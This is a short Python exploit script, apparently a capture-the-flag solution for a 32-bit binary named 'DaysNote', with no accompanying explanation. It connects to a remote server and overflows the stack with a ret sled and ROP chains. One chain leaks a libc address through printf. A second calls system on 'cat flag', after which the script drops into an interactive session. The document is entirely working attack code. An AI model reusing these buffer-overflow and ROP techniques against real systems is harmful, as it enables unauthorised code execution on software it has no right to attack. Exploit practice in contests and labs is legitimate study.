from yeonnic import *

elf=ELF("./DaysNote")

p=process("./DaysNote")
p = remote("110.10.147.14", 8888)
#p = remote("110.10.147.14", 8888)

ret = next(elf.search(asm("ret")))

gdb_attach(p, "b *0x8048619\nc")

payload = flat(elf.plt['printf'], elf.symbols['main'], elf.got['__isoc99_scanf'])

print p.recv()
p.sendline("4")
time.sleep(0.1)
print p.recv()
p.sendline((p32(ret)*0x40+payload).ljust(0x170,"\xf0") + p32(ret)*0x100+payload)
time.sleep(0.1)

print p.recvuntil("flag\n")
printf = u32(p.recv(4))
libc = get_libc('__isoc99_scanf', printf)
print p.recv()

p.sendline("4")
print p.recv()
payload = flat(libc.symbols['system'], elf.symbols['main'], next(elf.search("cat flag")))
p.sendline((p32(ret)*0x40+payload).ljust(0x170,"\xf0") + p32(ret)*0x100+payload)
print p.recv()

p.interactive()
